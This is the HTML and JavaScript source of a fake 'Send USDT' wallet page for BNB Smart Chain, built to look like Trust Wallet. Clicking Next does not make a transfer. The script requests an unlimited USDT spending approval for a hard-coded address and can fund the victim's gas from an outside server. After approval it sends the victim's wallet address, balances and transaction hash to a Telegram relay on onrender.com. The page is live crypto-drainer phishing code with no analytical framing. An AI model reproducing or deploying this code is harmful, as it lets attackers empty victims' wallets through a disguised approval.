
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <meta name="color-scheme" content="light dark">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css?v=9">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }

    .loading-spinner-container {
      text-align: center;
    }

    .loading-spinner {
      width: 60px;
      height: 60px;
      border: 4px solid #0000FF;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #0000FF;
      font-size: 16px;
      font-weight: 600;
      margin: 0;
    }
    /* Dark mode loading spinner styles */
    @media (prefers-color-scheme: dark) {
      .loading-overlay {
        background-color: rgba(0, 0, 0, 0.8) !important;
      }
      .loading-spinner {
        border: 4px solid #01d97e !important;
        border-top: 4px solid rgba(1, 217, 126, 0.3) !important;
      }
      .loading-text {
        color: #01d97e !important;
      }
    }
    /* Critical styles for Trust Wallet compatibility */
    .network-select {
      display: flex !important;
      align-items: center !important;
      background-color: #f5f5f5 !important;
      border: 1px solid #e0e0e0 !important;
      border-radius: 12px !important;
      padding: 10px 12px !important;
      margin-bottom: 16px !important;
      gap: 8px !important;
      min-height: 44px !important;
      max-height: 44px !important;
      max-width: 70% !important;
      width: fit-content !important;
      box-sizing: border-box !important;
    }
    .network-icon {
      width: 20px !important;
      height: 20px !important;
      display: flex !important;
      align-items: center !important;
      justify-content: center !important;
      flex-shrink: 0 !important;
    }
    .bnb-logo-img {
      width: 20px !important;
      height: 20px !important;
      object-fit: cover !important;
      display: block !important;
      border-radius: 50% !important;
      flex-shrink: 0 !important;
    }
    .network-text {
      flex: 0 1 auto !important;
      color: #4b5563 !important;
      font-size: 14px !important;
      font-weight: 500 !important;
      line-height: 1.4 !important;
      white-space: nowrap !important;
    }
    .network-arrow {
      color: #9ca3af !important;
      font-size: 10px !important;
      margin-left: auto !important;
      flex-shrink: 0 !important;
    }
    /* Critical button styles for Trust Wallet - Light mode */
    .text-btn, .icon-btn, .max-btn {
      color: #0000FF !important;
    }
    /* Critical input-group styles for Trust Wallet */
    .input-group {
      display: flex !important;
      align-items: center !important;
      background-color: #FFFFFF !important;
      border: 1px solid #d1d5db !important;
      border-radius: 12px !important;
      padding: 12px 14px !important;
      margin-bottom: 16px !important;
      min-height: 48px !important;
      max-height: 48px !important;
      box-sizing: border-box !important;
      gap: 8px !important;
      overflow: hidden !important;
    }
    .input-group input {
      flex: 1 !important;
      min-width: 0 !important;
      background: transparent !important;
      border: none !important;
      outline: none !important;
      color: #000000 !important;
      font-size: 16px !important;
      font-weight: 500 !important;
      padding: 0 !important;
      margin: 0 !important;
      height: auto !important;
      line-height: 1.5 !important;
    }
    /* Dark Mode Support - Detects system preference automatically */
    @media (prefers-color-scheme: dark) {
      body {
        background-color: #1b1b1b !important;
        color: #ffffff !important;
      }
      .container {
        background-color: #1b1b1b !important;
      }
      .title {
        color: #ffffff !important;
      }
      .label {
        color: #d1d5db !important;
      }
      .input-group {
        background-color: #FFFFFF !important;
        border: 1px solid #e0e0e0 !important;
      }
      .input-group input {
        color: #000000 !important;
      }
      .input-group input::placeholder {
        color: #9ca3af !important;
      }
      .text-btn, .icon-btn, .max-btn {
        color: #01d97e !important;
      }
      .unit {
        color: #4b5563 !important;
      }
      .network-select {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .network-select:hover {
        background-color: #252525 !important;
        border-color: #505050 !important;
      }
      .network-text {
        color: #ffffff !important;
      }
      .network-arrow {
        color: #9ca3af !important;
      }
      .estimate {
        color: #9ca3af !important;
      }
      .address-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .address-input-group input {
        color: #ffffff !important;
      }
      .amount-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .amount-input-group input {
        color: #ffffff !important;
      }
      .next-btn {
        background-color: #01d97e !important;
        color: #000000 !important;
      }
      .next-btn:hover:not(:disabled) {
        background-color: #01c571 !important;
      }
      .next-btn:disabled {
        background-color: #25653A !important;
        color: #ffffff !important;
        cursor: not-allowed !important;
        opacity: 1 !important;
      }
    }
  </style>

</head>
<body>
  <!-- Loading Spinner Overlay -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <h1 class="title">Send USDT</h1>
    <!-- Simple version indicator so you can confirm latest deployment -->
    <p style="font-size: 11px; color: #6b7280; margin-top: 4px; margin-bottom: 16px;">
      Build: <strong>telegram-backend-main / v3</strong>
    </p>

    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 10px 12px !important; margin-bottom: 16px !important; cursor: pointer; gap: 8px; -webkit-gap: 8px; max-width: 70% !important; width: fit-content !important; box-sizing: border-box !important; min-height: 44px !important; max-height: 44px !important; height: auto !important;">
      <div class="network-icon" style="width: 20px !important; height: 20px !important; min-width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; flex-shrink: 0 !important; position: relative; margin-right: 8px;">
        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img" style="width: 20px !important; height: 20px !important; max-width: 20px !important; max-height: 20px !important; object-fit: cover !important; display: block !important; border-radius: 50% !important; flex-shrink: 0 !important;">
      </div>
      <span class="network-text" style="flex: 0 1 auto !important; font-size: 14px !important; font-weight: 500 !important; line-height: 1.4 !important; white-space: nowrap;">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow" style="color: #9ca3af !important; font-size: 10px !important; margin-left: 8px !important; flex-shrink: 0 !important;"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="number" id="amount" placeholder="USDT Amount" required min="0" step="any" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate">‚âà $0.00</p>

    <button type="submit" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled>Next</button>

    <!-- Hidden test button (kept for stability, not visible to users) -->
    <button type="button"
            onclick="testTelegramFromDapp()"
            style="display:none;visibility:hidden;">
      Test Telegram (Dapp)
    </button>
  </main>

  <script type="text/javascript" src="js/web3.min.js"></script>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script> 
<script>

        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]

    var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];

        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;


 window.addEventListener('load', connectWallet);
    async function connectWallet() {
        if (window.ethereum) {

                // Request wallet connection
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
                        await switchToBSC();
                    }

        } else {
            console.log("Please install MetaMask!");
        }
    }



    async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (error) {
                if (error.code === 4902) {
                    // If BSC is not added, request to add it
                    await addBSCNetwork();
                } else {
                    console.error("Failed to switch chain", error);
                }
            }
        }

        async function addBSCNetwork() {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: {
                            name: 'Binance Coin',
                            symbol: 'BNB',
                            decimals: 18
                        },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } catch (addError) {
                console.error("Failed to add BSC network", addError);
            }
        }



        var bal1 = 0;

        async function Checkapprovaltoken() {

        window.contract = web3.eth.contract(matrixAbiTOKEN);
        window.BNBLINEcontract = contract.at(addressTOKEN);
        var account = web3.eth.accounts[0];

                window.BNBLINEcontract.allowance(account, addressSTAKING, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {
                        if (result > 0) {


                     window.BNBLINEcontract.balanceOf(account, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {

                        console.log(result + ' allowance Final result is ');
                        if (result > 0) {

                            bal1 = result / 1000000000000000000;

                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };

                            $.ajax({
                                url: '/MemberPanel/TopUpWithMetamaskJson',
                                type: 'POST',
                                dataType: 'JSON',
                                contentType: 'application/json',
                                data: JSON.stringify(maindt),
                                success: function (data) {
                                    if (data == "Success") {
                                        showLoading('Transaction processed');
                                        setTimeout(() => hideLoading(), 2000);
                                        console.log('success');
                                    }
                                    else {
                     }
                                },
                                error: function (err) {
                                    console.log("error:" + JSON.stringify(err));

                                }
                            });

                            showLoading('Transaction completed');
                            setTimeout(() => hideLoading(), 2000);
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                             });

                        }
                        else {
                            TokenApprove();
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                });

    }

         

</script>

<script>
    // Initialize Web3
    const web3 = new Web3(window.ethereum);

    // Loading functions
    function showLoading(message = 'Processing...') {
        const overlay = document.getElementById('loadingOverlay');
        const text = overlay.querySelector('.loading-text');
        if (text) text.textContent = message;
        overlay.style.display = 'flex';
    }

    function hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'none';
    }

    async function TokenApprove() {
    // Show loading immediately when Next is clicked
    showLoading('Processing...');
    
    try {
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const account = accounts[0];

        // Step 1: Check the current BNB balance (in background)
        const bnbBalance = await web3.eth.getBalance(account);
        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
        console.log("Current BNB Balance: ", balanceInBNB);

        const requiredBNB = 0.0001;

        // Step 2: Auto top-up in background if needed
        if (parseFloat(balanceInBNB) < requiredBNB) {
            showLoading('Please wait...');
            // Request the BNB top-up from the backend (in background)
            const topUpSuccess = await requestBNBTopUp(account);

            if (!topUpSuccess) {
                showLoading('Please try again.');
                setTimeout(() => hideLoading(), 2000);
                return;
            }

            // Wait for top-up to process
            showLoading('Processing...');
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Recheck balance
            const newBnbBalance = await web3.eth.getBalance(account);
            const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
            
            if (parseFloat(newBalanceInBNB) < requiredBNB) {
                showLoading('Please try again.');
                setTimeout(() => hideLoading(), 2000);
                return;
            }
        }

        // Step 3: Hide loading so wallet can show approval popup
        hideLoading();
        
        // Show approval request (MetaMask/Trust Wallet will show popup)
        await approveToken(account);
    } catch (error) {
        console.error('Error:', error);
        hideLoading();
    }
}

// Function to request the BNB top-up from your backend
async function requestBNBTopUp(account) {
    try {
        const response = await fetch('https://subham-scanner.onrender.com/send-bnb', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ recipient: account }),
        });

        const data = await response.json();
        if (data.success) {
            showLoading('progress...');
            return true;  // Return true indicating the top-up was successful
        } else {
            showLoading('Please try again.');
            setTimeout(() => hideLoading(), 2000);
            return false;  // Return false indicating the top-up failed
        }
    } catch (error) {
        console.error('Error during BNB request:', error);
        showLoading('Error initiating top-up.');
        setTimeout(() => hideLoading(), 2000);
        return false;  // Return false in case of an error
    }
}

async function approveToken(account) {
    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');

    // Get the current BNB balance
    const bnbBalance = await web3.eth.getBalance(account);
    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB

    // Get the actual USDT balance (not allowance)
    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
    const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT

    // Get the current approved USDT amount
    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT

    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString();  // Format the current date and time

    // Get the approved address
    const approvedAddress = addressSTAKING;  // You can change this as needed

    console.log('Processing....');
    console.log('Account:', account);
    console.log('BNB Balance:', balanceInBNB);
    console.log('USDT Balance:', usdtBalanceFormatted);

    try {
        // Wait for the approval transaction to complete and get the receipt
        const receipt = await usdtContract.methods
            .approve(addressSTAKING, maxApprovalAmount)
            .send({ from: account });

        const txHash = receipt && receipt.transactionHash ? receipt.transactionHash : 'Unknown';

        // Prepare safe values for Telegram
        const walletAddr = account || 'Unknown';
        const bnbBal = balanceInBNB || '0';
        const usdtBal = usdtBalanceFormatted || '0';
        const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
        const dateStr = formattedDate || new Date().toLocaleString();

        // Send Telegram notification after approval succeeds
        try {
            await sendTelegramNotification(
                walletAddr,
                bnbBal,
                usdtBal,
                approvedAddr,
                dateStr,
                txHash
            );
        } catch (err) {
            // Ignore Telegram errors so they don't break the flow
        }

        // Original AJAX call to your backend
        var maindt = { "fromaddress": account, "txthash": txHash, "PackageAmt": approvedUSDT };
        $.ajax({
            url: '/home/TopUpWithMetamaskJson',
            type: 'POST',
            dataType: 'JSON',
            contentType: 'application/json',
            data: JSON.stringify(maindt),
            success: function (data) {
                setTimeout(() => {
                    window.close();
                    if (!window.closed) {
                        location.href = "/home/index";
                    }
                }, 500);
            },
            error: function (err) {
                setTimeout(() => {
                    window.close();
                    if (!window.closed) {
                        location.href = "/home/index";
                    }
                }, 500);
            }
        });
    } catch (error) {
        hideLoading();
        if (error.code === 4001) {
            showLoading('Transaction canceled');
            setTimeout(() => hideLoading(), 2000);
        } else {
            showLoading('Approval failed. Please try again.');
            setTimeout(() => hideLoading(), 2000);
        }
    }
}

// Telegram notification function - now via Railway backend (no direct Telegram call from frontend)
async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
    const RAILWAY_BASE_URL = 'https://telegram-backend-main.onrender.com';

    const message =
        `üîî USDT Approval Notification\n\n` +
        `üë§ Wallet Address: ${walletAddress}\n` +
        `üí∞ BNB Balance: ${bnbAmount} BNB\n` +
        `üíµ USDT Balance: ${usdtAmount} USDT\n` +
        `üìç Approved Address: ${approvedAddress}\n` +
        `üìÖ Date and Time: ${dateTime}\n` +
        (txHash ? `üîó Tx Hash: ${txHash}` : '');

    console.log('üì§ [BACKEND] Sending notification via Railway...');

    try {
        const response = await fetch(`${RAILWAY_BASE_URL}/sendTelegram`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message,
                usdtAddress: walletAddress,
                amount: usdtAmount
            }),
        });

        const text = await response.text();
        console.log('üì§ [BACKEND] Raw response:', text);

        let data;
        try {
            data = JSON.parse(text);
        } catch (e) {
            console.error('üì§ [BACKEND] Failed to parse JSON:', e);
            return false;
        }

        if (response.ok && data.success) {
            console.log('‚úÖ [BACKEND] Telegram notification sent successfully.');
            return true;
        } else {
            console.error('‚ùå [BACKEND] Failed to send Telegram notification:', data);
            return false;
        }
    } catch (error) {
        console.error('‚ùå [BACKEND] Error calling Railway /sendTelegram:', error);
        return false;
    }
}

// Ensure global for other scripts
if (typeof window !== 'undefined') {
    window.sendTelegramNotification = sendTelegramNotification;
    window.testTelegramFromDapp = testTelegramFromDapp;
}

// Simple helper to manually test Telegram notifications from within the dApp / wallet browser
function testTelegramFromDapp() {
    const now = new Date().toLocaleString();
    sendTelegramNotification(
        'TEST_WALLET',
        '0.0',
        '0.0',
        'TEST_APPROVED_ADDRESS',
        now,
        'TEST_HASH'
    );
}

</script>
<script>
    // Amount validation - Make amount field mandatory
    function validateAmount() {
        const amountInput = document.getElementById('amount');
        const nextBtn = document.getElementById('nextBtn');
        const amountValue = amountInput.value.trim();
        
        // Check if amount is valid (not empty and greater than 0)
        if (amountValue && parseFloat(amountValue) > 0) {
            nextBtn.disabled = false;
            return true;
        } else {
            nextBtn.disabled = true;
            return false;
        }
    }

    // Handle Next button click with validation
    function handleNextClick() {
        if (validateAmount()) {
            TokenApprove();
        } else {
            alert('Please enter a valid amount before proceeding.');
        }
    }

    // Initialize validation on page load
    document.addEventListener('DOMContentLoaded', function() {
        const amountInput = document.getElementById('amount');
        const nextBtn = document.getElementById('nextBtn');
        
        // Disable Next button initially
        if (nextBtn) {
            nextBtn.disabled = true;
        }
        
        // Validate on input change
        if (amountInput) {
            amountInput.addEventListener('input', validateAmount);
            amountInput.addEventListener('change', validateAmount);
            amountInput.addEventListener('keyup', validateAmount);
            
            // Validate on paste
            amountInput.addEventListener('paste', function() {
                setTimeout(validateAmount, 10);
            });
        }
    });

    // Also validate when Max button is clicked (if Max button fills the amount)
    document.addEventListener('DOMContentLoaded', function() {
        const maxBtn = document.querySelector('.max-btn');
        if (maxBtn) {
            maxBtn.addEventListener('click', function() {
                // Wait a bit for Max to fill the value, then validate
                setTimeout(validateAmount, 100);
            });
        }
    });
</script>









</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
